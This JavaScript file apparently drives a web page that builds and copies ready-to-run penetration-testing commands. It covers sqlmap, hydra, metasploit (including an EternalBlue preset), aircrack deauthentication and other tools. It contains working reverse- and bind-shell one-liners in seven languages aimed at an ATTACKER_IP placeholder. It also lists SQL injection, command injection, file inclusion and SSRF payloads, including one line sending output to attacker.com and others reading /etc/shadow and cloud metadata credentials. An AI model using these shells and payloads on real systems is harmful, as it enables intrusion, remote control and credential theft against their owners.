// ═══════════════════════════════════════════════
// TOOL SWITCHING
// ═══════════════════════════════════════════════
const tools = ['sqlmap','ffuf','hydra','nikto','netcat','gobuster','wireshark','amass','metasploit','john','dirsearch','aircrack','payload'];

function switchTool(tool) {
  tools.forEach(t => {
    document.getElementById('panel-' + t).classList.remove('active');
  });
  document.getElementById('panel-' + tool).classList.add('active');
  document.querySelectorAll('.nav-btn').forEach((btn, i) => {
    btn.classList.toggle('active', tools[i] === tool);
  });
}

// ═══════════════════════════════════════════════
// INNER TABS
// ═══════════════════════════════════════════════
function switchInnerTab(group, tab) {
  const prefix = group + '-tab-';
  document.querySelectorAll(`[id^="${prefix}"]`).forEach(el => el.classList.remove('active'));
  document.getElementById(prefix + tab).classList.add('active');

  // find tab buttons inside current active panel
  const panel = document.querySelector('.tool-panel.active');
  panel.querySelectorAll('.inner-tab').forEach(btn => {
    btn.classList.toggle('active', btn.getAttribute('onclick').includes("'" + tab + "'"));
  });
}

// ═══════════════════════════════════════════════
// COPY
// ═══════════════════════════════════════════════
function copyCmd(id) {
  const el = document.getElementById(id);
  const text = el.innerText.replace(/^\$\s?/, '').trim();
  navigator.clipboard.writeText(text).then(() => {
    const prefix = id.split('-output')[0].split('-box')[0].split('-')[0];
    // find nearest copy-feedback
    const fb = el.parentElement.querySelector('.copy-feedback');
    if (fb) {
      fb.classList.add('show');
      setTimeout(() => fb.classList.remove('show'), 1500);
    }
  });
}

// ═══════════════════════════════════════════════
// RESET
// ═══════════════════════════════════════════════
function resetPanel(tool) {
  const panel = document.getElementById('panel-' + tool);
  panel.querySelectorAll('input[type="text"], input[type="number"]').forEach(i => i.value = '');
  panel.querySelectorAll('select').forEach(s => s.selectedIndex = 0);
  panel.querySelectorAll('input[type="checkbox"]').forEach(c => c.checked = false);
  // retrigger build
  const builders = { sqlmap: buildSqlmap, ffuf: buildFfuf, hydra: buildHydra, nikto: buildNikto,
    gobuster: buildGobuster, wireshark: buildTshark, amass: buildAmass, metasploit: buildMsf,
    john: buildJohn, dirsearch: buildDirsearch };
  if (builders[tool]) builders[tool]();
}

// ═══════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════
function val(id) { const e = document.getElementById(id); return e ? e.value.trim() : ''; }
function chk(id) { const e = document.getElementById(id); return e ? e.checked : false; }
function setOut(id, cmd) { document.getElementById(id).innerHTML = '<span class="prompt">$</span> ' + cmd; }

// ═══════════════════════════════════════════════
// SQLMAP BUILDER
// ═══════════════════════════════════════════════
function buildSqlmap() {
  let cmd = 'sqlmap';
  const url = val('sql-url');
  if (url) cmd += ` -u "${url}"`;
  const cookie = val('sql-cookie');
  if (cookie) cmd += ` --cookie="${cookie}"`;
  const proxy = val('sql-proxy');
  if (proxy) cmd += ` --proxy="${proxy}"`;
  const threads = val('sql-threads');
  if (threads) cmd += ` --threads=${threads}`;
  if (chk('sql-batch')) cmd += ' --batch';
  if (chk('sql-dbs')) cmd += ' --dbs';
  if (chk('sql-dump')) cmd += ' --dump';
  if (chk('sql-dump-all')) cmd += ' --dump-all';
  if (chk('sql-random-agent')) cmd += ' --random-agent';
  if (chk('sql-tor')) cmd += ' --tor --check-tor';
  if (chk('sql-dork')) cmd += ' --forms';
  if (chk('sql-os-shell')) cmd += ' --os-shell';
  if (chk('sql-tamper')) cmd += ' --tamper=space2comment';
  const risk = val('sql-risk');
  if (risk) cmd += ' ' + risk;
  const level = val('sql-level');
  if (level) cmd += ' ' + level;
  const dbms = val('sql-dbms');
  if (dbms) cmd += ' ' + dbms;
  const tech = val('sql-tech');
  if (tech) cmd += ' -' + tech;
  setOut('sql-output', cmd);
}

// ═══════════════════════════════════════════════
// FFUF BUILDER
// ═══════════════════════════════════════════════
function buildFfuf() {
  let cmd = 'ffuf';
  const url = val('ffuf-url');
  if (url) cmd += ` -u "${url}"`;
  const wl = val('ffuf-wordlist');
  if (wl) cmd += ` -w ${wl}`;
  const ext = val('ffuf-ext');
  if (ext) cmd += ` -e .${ext.split(',').join(',.')}`;
  const threads = val('ffuf-threads');
  if (threads) cmd += ` -t ${threads}`;
  const mc = val('ffuf-mc');
  if (mc) cmd += ` -mc ${mc}`;
  const fc = val('ffuf-fc');
  if (fc) cmd += ` -fc ${fc}`;
  const timeout = val('ffuf-timeout');
  if (timeout) cmd += ` -timeout ${timeout}`;
  const delay = val('ffuf-delay');
  if (delay) cmd += ` -p "${delay}"`;
  if (chk('ffuf-r')) cmd += ' -r';
  if (chk('ffuf-v')) cmd += ' -v';
  if (chk('ffuf-recursion')) cmd += ' -recursion';
  if (chk('ffuf-silent')) cmd += ' -s';
  const fmt = val('ffuf-format');
  if (fmt) cmd += ' ' + fmt;
  const out = val('ffuf-output');
  if (out) cmd += ` -o ${out}`;
  setOut('ffuf-output-box', cmd);
}

// ═══════════════════════════════════════════════
// HYDRA BUILDER
// ═══════════════════════════════════════════════
function buildHydra() {
  const proto = val('hydra-proto');
  const formField = document.getElementById('hydra-form-field');
  if (proto === 'http-post-form') {
    formField.style.display = 'flex';
  } else {
    formField.style.display = 'none';
  }

  let cmd = 'hydra';
  const user = val('hydra-user');
  const userlist = val('hydra-userlist');
  if (userlist) cmd += ` -L ${userlist}`;
  else if (user) cmd += ` -l ${user}`;
  const pass = val('hydra-pass');
  const passlist = val('hydra-passlist');
  if (passlist) cmd += ` -P ${passlist}`;
  else if (pass) cmd += ` -p ${pass}`;
  const threads = val('hydra-threads');
  if (threads) cmd += ` -t ${threads}`;
  if (chk('hydra-v')) cmd += ' -v';
  if (chk('hydra-vv')) cmd += ' -V';
  if (chk('hydra-f')) cmd += ' -f';
  if (chk('hydra-e')) cmd += ' -e nsr';
  if (chk('hydra-s')) cmd += ' -S';
  if (chk('hydra-o')) cmd += ' -o results.txt';
  const port = val('hydra-port');
  if (port) cmd += ` -s ${port}`;
  const target = val('hydra-target');
  const form = val('hydra-form');
  if (target) {
    if (proto === 'http-post-form' && form) {
      cmd += ` ${target} ${proto} "${form}"`;
    } else {
      cmd += ` ${proto}://${target}`;
    }
  }
  setOut('hydra-output', cmd);
}

// ═══════════════════════════════════════════════
// NIKTO BUILDER
// ═══════════════════════════════════════════════
function buildNikto() {
  let cmd = 'nikto';
  const host = val('nikto-host');
  if (host) cmd += ` -h ${host}`;
  const port = val('nikto-port');
  if (port) cmd += ` -p ${port}`;
  if (chk('nikto-ssl')) cmd += ' -ssl';
  if (chk('nikto-nossl')) cmd += ' -nossl';
  if (chk('nikto-evasion')) cmd += ' -evasion 1';
  if (chk('nikto-ask')) cmd += ' -ask no';
  if (chk('nikto-followredirects')) cmd += ' -followredirects';
  if (chk('nikto-format-html')) cmd += ' -Format htm -output report.html';
  const proxy = val('nikto-proxy');
  if (proxy) cmd += ` -useproxy ${proxy}`;
  const out = val('nikto-output');
  if (out && !chk('nikto-format-html')) cmd += ` -output ${out}`;
  const tuning = val('nikto-tuning');
  if (tuning) cmd += ' ' + tuning;
  setOut('nikto-output-box', cmd);
}

// ═══════════════════════════════════════════════
// NETCAT BUILDERS
// ═══════════════════════════════════════════════
function buildNetcat(type) {
  if (type === 'listener') {
    let cmd = 'nc';
    if (chk('nc-l-n')) cmd += ' -n';
    if (chk('nc-l-v')) cmd += ' -v';
    const mode = val('nc-listen-mode');
    if (mode) cmd += ' ' + mode;
    cmd += ' -l';
    const port = val('nc-listen-port') || '4444';
    cmd += ' -p ' + port;
    setOut('nc-listener-output', cmd);
  } else if (type === 'connect') {
    let cmd = 'nc';
    if (chk('nc-c-n')) cmd += ' -n';
    if (chk('nc-c-v')) cmd += ' -v';
    if (chk('nc-c-z')) cmd += ' -z';
    const host = val('nc-conn-host') || 'target.com';
    const port = val('nc-conn-port') || '80';
    cmd += ` ${host} ${port}`;
    setOut('nc-connect-output', cmd);
  }
}

const reverseShells = [
  { name: 'Netcat (traditional)', template: 'nc -e /bin/bash {IP} {PORT}' },
  { name: 'Netcat (mkfifo)', template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f' },
  { name: 'Bash TCP', template: 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' },
  { name: 'Bash UDP', template: 'bash -i >& /dev/udp/{IP}/{PORT} 0>&1' },
  { name: 'Python 3', template: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' },
  { name: 'Python 2', template: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'' },
  { name: 'PHP', template: 'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
  { name: 'Perl', template: 'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
  { name: 'Ruby', template: 'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'' },
  { name: 'PowerShell', template: 'powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
];

let selectedShell = 0;

function initShellGrid() {
  const grid = document.getElementById('shell-grid');
  grid.innerHTML = reverseShells.map((s, i) => `
    <button class="shell-card ${i === 0 ? 'active' : ''}" onclick="selectShell(${i})">
      <span class="shell-card-name">${s.name}</span>
      <span class="shell-card-cmd">${s.template.substring(0, 30)}...</span>
    </button>
  `).join('');
}

function selectShell(i) {
  selectedShell = i;
  document.querySelectorAll('.shell-card').forEach((c, idx) => c.classList.toggle('active', idx === i));
  buildReverseShells();
}

function buildReverseShells() {
  const ip = val('nc-rs-ip') || 'ATTACKER_IP';
  const port = val('nc-rs-port') || '4444';
  const shell = reverseShells[selectedShell];
  const cmd = shell.template.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port);
  setOut('nc-shell-output', cmd);
}

function buildBindShell() {
  const port = val('nc-bind-port') || '4444';
  const os = val('nc-bind-os');
  let victimCmd, attackerCmd;
  if (os === 'linux') {
    victimCmd = `nc -lvnp ${port} -e /bin/bash`;
    attackerCmd = `nc [TARGET_IP] ${port}`;
  } else {
    victimCmd = `nc -lvnp ${port} -e cmd.exe`;
    attackerCmd = `nc [TARGET_IP] ${port}`;
  }
  setOut('nc-bind-victim', victimCmd);
  document.getElementById('nc-bind-attacker').innerHTML = '<span class="prompt">$</span> ' + attackerCmd;
}

// ═══════════════════════════════════════════════
// GOBUSTER BUILDER
// ═══════════════════════════════════════════════
function buildGobuster() {
  const mode = val('gob-mode');
  let cmd = `gobuster ${mode}`;
  const url = val('gob-url');
  if (url) cmd += ` -u ${url}`;
  const wl = val('gob-wordlist');
  if (wl) cmd += ` -w ${wl}`;
  const ext = val('gob-ext');
  if (ext && mode === 'dir') cmd += ` -x ${ext}`;
  const threads = val('gob-threads');
  if (threads) cmd += ` -t ${threads}`;
  const status = val('gob-status');
  if (status) cmd += ` -s ${status}`;
  const ua = val('gob-ua');
  if (ua) cmd += ` -a "${ua}"`;
  const out = val('gob-out');
  if (out) cmd += ` -o ${out}`;
  if (chk('gob-r')) cmd += ' -r';
  if (chk('gob-q')) cmd += ' -q';
  if (chk('gob-k')) cmd += ' -k';
  if (chk('gob-wildcard')) cmd += ' --wildcard';
  if (chk('gob-no-error')) cmd += ' --no-error';
  setOut('gob-output', cmd);
}

// ═══════════════════════════════════════════════
// TSHARK BUILDER
// ═══════════════════════════════════════════════
function buildTshark() {
  let cmd = 'tshark';
  const iface = val('ts-iface');
  if (iface) cmd += ` -i ${iface}`;
  const read = val('ts-read');
  if (read) cmd += ` -r ${read}`;
  const filter = val('ts-filter');
  if (filter) cmd += ` -f "${filter}"`;
  const dfilter = val('ts-dfilter');
  if (dfilter) cmd += ` -Y "${dfilter}"`;
  const count = val('ts-count');
  if (count) cmd += ` -c ${count}`;
  const fields = val('ts-fields');
  if (fields) {
    fields.split(',').forEach(f => { cmd += ` -e ${f.trim()}`; });
    cmd += ' -T fields';
  }
  if (chk('ts-v')) cmd += ' -V';
  if (chk('ts-q')) cmd += ' -q';
  if (chk('ts-x')) cmd += ' -x';
  if (chk('ts-n')) cmd += ' -n';
  if (chk('ts-p')) cmd += ' -p';
  const write = val('ts-write');
  if (write) cmd += ` -w ${write}`;
  setOut('ts-output', cmd);
}

// ═══════════════════════════════════════════════
// AMASS BUILDER
// ═══════════════════════════════════════════════
function buildAmass() {
  const sub = val('amass-sub');
  let cmd = `amass ${sub}`;
  const domain = val('amass-domain');
  if (domain) cmd += ` -d ${domain}`;
  if (chk('amass-passive')) cmd += ' -passive';
  if (chk('amass-brute')) cmd += ' -brute';
  if (chk('amass-whois')) cmd += ' -whois';
  if (chk('amass-ip')) cmd += ' -ip';
  if (chk('amass-v')) cmd += ' -v';
  if (chk('amass-norecursive')) cmd += ' -norecursive';
  const config = val('amass-config');
  if (config) cmd += ` -config ${config}`;
  const resolvers = val('amass-resolvers');
  if (resolvers) cmd += ` -rf ${resolvers}`;
  const timeout = val('amass-timeout');
  if (timeout) cmd += ` -timeout ${timeout}`;
  const out = val('amass-out');
  if (out) cmd += ` -o ${out}`;
  setOut('amass-output', cmd);
}

// ═══════════════════════════════════════════════
// METASPLOIT BUILDER
// ═══════════════════════════════════════════════
function buildMsf() {
  const exploit = val('msf-exploit');
  const payload = val('msf-payload');
  const rhost = val('msf-rhost');
  const rport = val('msf-rport');
  const lhost = val('msf-lhost');
  const lport = val('msf-lport');

  let lines = [];
  if (exploit) lines.push(`use ${exploit}`);
  if (payload) lines.push(`set PAYLOAD ${payload}`);
  if (rhost) lines.push(`set RHOSTS ${rhost}`);
  if (rport) lines.push(`set RPORT ${rport}`);
  if (lhost) lines.push(`set LHOST ${lhost}`);
  if (lport) lines.push(`set LPORT ${lport}`);
  if (lines.length > 0) lines.push('run');

  if (lines.length === 0) {
    document.getElementById('msf-output').innerHTML = '<span class="prompt">msf6></span> <span style="color:var(--muted)"># fill fields to generate</span>';
    return;
  }

  document.getElementById('msf-output').innerHTML = lines.map((l, i) =>
    `<span class="prompt">msf6></span> ${l}`
  ).join('\n');
}

// ═══════════════════════════════════════════════
// JOHN BUILDER
// ═══════════════════════════════════════════════
function buildJohn() {
  let cmd = 'john';
  const file = val('john-file');
  if (file) cmd += ` ${file}`;
  const format = val('john-format');
  if (format) cmd += ' ' + format;
  const wl = val('john-wordlist');
  if (wl) cmd += ` --wordlist=${wl}`;
  const rules = val('john-rules');
  if (rules) cmd += ' ' + rules;
  const inc = val('john-inc');
  if (inc) cmd += ' ' + inc;
  const minmax = val('john-minmax');
  if (minmax) cmd += ' ' + minmax;
  if (chk('john-show')) cmd += ' --show';
  if (chk('john-pot')) cmd += ' --pot=john.pot';
  if (chk('john-fork')) cmd += ' --fork=4';
  setOut('john-output', cmd);
}

// ═══════════════════════════════════════════════
// DIRSEARCH BUILDER
// ═══════════════════════════════════════════════
function buildDirsearch() {
  let cmd = 'python3 dirsearch.py';
  const url = val('ds-url');
  if (url) cmd += ` -u ${url}`;
  const ext = val('ds-ext');
  if (ext) cmd += ` -e ${ext}`;
  const wl = val('ds-wordlist');
  if (wl) cmd += ` -w ${wl}`;
  const threads = val('ds-threads');
  if (threads) cmd += ` -t ${threads}`;
  const exclude = val('ds-exclude');
  if (exclude) cmd += ` --exclude-status=${exclude}`;
  const proxy = val('ds-proxy');
  if (proxy) cmd += ` --proxy=${proxy}`;
  const out = val('ds-out');
  if (out) cmd += ` --output=${out}`;
  const delay = val('ds-delay');
  if (delay) cmd += ` --delay=${delay}`;
  if (chk('ds-r')) cmd += ' -r';
  if (chk('ds-R')) cmd += ' --deep-recursive';
  if (chk('ds-F')) cmd += ' -F';
  if (chk('ds-q')) cmd += ' -q';
  if (chk('ds-random-ua')) cmd += ' --random-agent';
  setOut('ds-output', cmd);
}

// ═══════════════════════════════════════════════
// AIRCRACK BUILDERS
// ═══════════════════════════════════════════════
function buildAirmon() {
  const iface = val('air-mon-iface') || 'wlan0';
  const chan = val('air-mon-channel');
  let cmd = `airmon-ng start ${iface}`;
  if (chan) cmd += ` ${chan}`;
  document.getElementById('air-mon-start').innerHTML = '<span class="prompt">$</span> ' + cmd;
  document.getElementById('air-mon-kill').innerHTML = '<span class="prompt">$</span> airmon-ng check kill';
}

function buildAircap() {
  let cmd = 'airodump-ng';
  const iface = val('air-cap-iface') || 'wlan0mon';
  const bssid = val('air-cap-bssid');
  const chan = val('air-cap-channel');
  const out = val('air-cap-out');
  if (bssid) cmd += ` --bssid ${bssid}`;
  if (chan) cmd += ` -c ${chan}`;
  if (out) cmd += ` -w ${out}`;
  cmd += ` ${iface}`;
  document.getElementById('air-cap-output').innerHTML = '<span class="prompt">$</span> ' + cmd;
}

function buildAireplay() {
  const iface = val('air-de-iface') || 'wlan0mon';
  const bssid = val('air-de-bssid') || '[BSSID]';
  const client = val('air-de-client');
  const count = val('air-de-count') || '10';
  let cmd = `aireplay-ng --deauth ${count} -a ${bssid}`;
  if (client) cmd += ` -c ${client}`;
  cmd += ` ${iface}`;
  document.getElementById('air-de-output').innerHTML = '<span class="prompt">$</span> ' + cmd;
}

function buildAircrack() {
  const cap = val('air-crack-cap') || 'capture-01.cap';
  const wl = val('air-crack-wl');
  const bssid = val('air-crack-bssid');
  const enc = val('air-crack-enc');
  let cmd = `aircrack-ng ${cap}`;
  if (wl) cmd += ` -w ${wl}`;
  if (bssid) cmd += ` -b ${bssid}`;
  if (enc) cmd += ` ${enc}`;
  document.getElementById('air-crack-output').innerHTML = '<span class="prompt">$</span> ' + cmd;
}

// ═══════════════════════════════════════════════
// PAYLOAD LISTS
// ═══════════════════════════════════════════════
const PAYLOADS = {
  
  sqli: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "admin'--",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1; DROP TABLE users--",
    "' OR 'x'='x",
    "1' AND 1=2 UNION SELECT username,password FROM users--",
    "' HAVING 1=1--",
    "1'; EXEC xp_cmdshell('dir')--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT version())))--",
  ],
  cmdi: [
    '; ls',
    '| ls',
    '|| ls',
    '& ls',
    '&& ls',
    '`ls`',
    '$(ls)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '; whoami',
    '; id',
    '%0a ls',
    '| ping -c 1 attacker.com',
    '; curl http://attacker.com/$(whoami)',
  ],
  lfi: [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '/etc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://input',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
    '../../../windows/system32/drivers/etc/hosts',
    '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '../../../proc/self/environ',
    'expect://ls',
    '../../../var/log/apache2/access.log',
    'file:///etc/passwd',
    '../../../etc/shadow',
    '../../../etc/ssh/sshd_config',
  ],
  ssrf: [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://169.254.169.254/latest/meta-data/',
    'http://[::1]/',
    'http://0.0.0.0/',
    'http://2130706433/',
    'http://0177.0.0.1/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/',
    'http://100.100.100.200/latest/meta-data/',
    'dict://127.0.0.1:6379/',
    'gopher://127.0.0.1:6379/_INFO',
    'file:///etc/passwd',
    'http://localhost:8080/admin',
  ],
};

function initPayloads() {
  Object.keys(PAYLOADS).forEach(type => {
    const container = document.getElementById(type + '-payloads');
    if (!container) return;
    container.innerHTML = PAYLOADS[type].map(p => `
      <div class="payload-item">
        <span>${escHtml(p)}</span>
        <span class="copy-mini" onclick="copyText(this, '${escAttr(p)}')">COPY</span>
      </div>
    `).join('');
  });
}

function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function escAttr(s) { return s.replace(/'/g,"\\'").replace(/"/g,'&quot;'); }

function copyText(btn, text) {
  const decoded = text.replace(/\\'/g, "'").replace(/&quot;/g, '"');
  navigator.clipboard.writeText(decoded).then(() => {
    const orig = btn.textContent;
    btn.textContent = 'COPIED!';
    btn.style.color = 'var(--accent3)';
    btn.style.borderColor = 'var(--accent3)';
    setTimeout(() => {
      btn.textContent = orig;
      btn.style.color = '';
      btn.style.borderColor = '';
    }, 1200);
  });
}

// ═══════════════════════════════════════════════
// PRESETS
// ═══════════════════════════════════════════════
const PRESETS = {
  sqlmap: {
    basic: { 'sql-url': 'http://target.com/page?id=1', 'sql-batch': true, 'sql-dbs': true },
    aggressive: { 'sql-url': 'http://target.com/page?id=1', 'sql-batch': true, 'sql-risk': '--risk=3', 'sql-level': '--level=5', 'sql-random-agent': true, 'sql-dump': true, 'sql-threads': '10' },
    'dump-all': { 'sql-url': 'http://target.com/page?id=1', 'sql-batch': true, 'sql-dump-all': true, 'sql-random-agent': true },
    stealth: { 'sql-url': 'http://target.com/page?id=1', 'sql-batch': true, 'sql-random-agent': true, 'sql-tamper': true, 'sql-proxy': 'http://127.0.0.1:8080', 'sql-tor': true }
  },
  ffuf: {
    dirs: { 'ffuf-url': 'http://target.com/FUZZ', 'ffuf-wordlist': '/usr/share/wordlists/dirb/common.txt', 'ffuf-mc': '200,301,302', 'ffuf-threads': '50' },
    subdomains: { 'ffuf-url': 'http://FUZZ.target.com', 'ffuf-wordlist': '/usr/share/wordlists/subdomains.txt', 'ffuf-mc': '200,301', 'ffuf-threads': '30' },
    params: { 'ffuf-url': 'http://target.com/page?FUZZ=value', 'ffuf-wordlist': '/usr/share/wordlists/params.txt', 'ffuf-mc': '200' },
    api: { 'ffuf-url': 'http://target.com/api/FUZZ', 'ffuf-wordlist': '/usr/share/wordlists/api-endpoints.txt', 'ffuf-mc': '200,201,401,403', 'ffuf-threads': '40' }
  },
  hydra: {
    ssh: { 'hydra-proto': 'ssh', 'hydra-userlist': '/usr/share/wordlists/users.txt', 'hydra-passlist': '/usr/share/wordlists/rockyou.txt', 'hydra-threads': '4', 'hydra-vv': true },
    ftp: { 'hydra-proto': 'ftp', 'hydra-user': 'admin', 'hydra-passlist': '/usr/share/wordlists/rockyou.txt', 'hydra-threads': '8', 'hydra-vv': true },
    http: { 'hydra-proto': 'http-post-form', 'hydra-userlist': '/usr/share/wordlists/users.txt', 'hydra-passlist': '/usr/share/wordlists/rockyou.txt', 'hydra-form': '/login:user=^USER^&pass=^PASS^:Invalid credentials' },
    rdp: { 'hydra-proto': 'rdp', 'hydra-userlist': '/usr/share/wordlists/users.txt', 'hydra-passlist': '/usr/share/wordlists/rockyou.txt', 'hydra-threads': '1' }
  },
  tshark: {
    http: { 'ts-iface': 'eth0', 'ts-dfilter': 'http', 'ts-fields': 'ip.src,http.host,http.request.uri' },
    dns: { 'ts-iface': 'eth0', 'ts-dfilter': 'dns', 'ts-fields': 'ip.src,dns.qry.name' },
    creds: { 'ts-iface': 'eth0', 'ts-dfilter': 'ftp or http or smtp', 'ts-fields': 'ip.src,ip.dst,tcp.payload' },
    pcap: { 'ts-read': 'capture.pcap', 'ts-dfilter': 'http or dns' }
  },
  msf: {
    eternalblue: { 'msf-exploit': 'exploit/windows/smb/ms17_010_eternalblue', 'msf-payload': 'windows/x64/meterpreter/reverse_tcp', 'msf-rport': '445', 'msf-lport': '4444' },
    meterpreter: { 'msf-exploit': 'multi/handler', 'msf-payload': 'windows/x64/meterpreter/reverse_tcp', 'msf-lport': '4444' },
    handler: { 'msf-exploit': 'multi/handler', 'msf-payload': 'linux/x64/shell/reverse_tcp', 'msf-lport': '4444' }
  }
};

function loadPreset(tool, preset) {
  const p = PRESETS[tool]?.[preset];
  if (!p) return;
  Object.entries(p).forEach(([id, val]) => {
    const el = document.getElementById(id);
    if (!el) return;
    if (el.type === 'checkbox') el.checked = !!val;
    else el.value = val;
  });
  const builders = { sqlmap: buildSqlmap, ffuf: buildFfuf, hydra: buildHydra, tshark: buildTshark, msf: buildMsf };
  if (builders[tool]) builders[tool]();
}

// ═══════════════════════════════════════════════
// INIT
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  initShellGrid();
  initPayloads();
  buildSqlmap();
  buildAmass();
  buildNetcat('listener');
  buildBindShell();
  buildAirmon();
  buildAircap();
  buildAireplay();
  buildAircrack();
});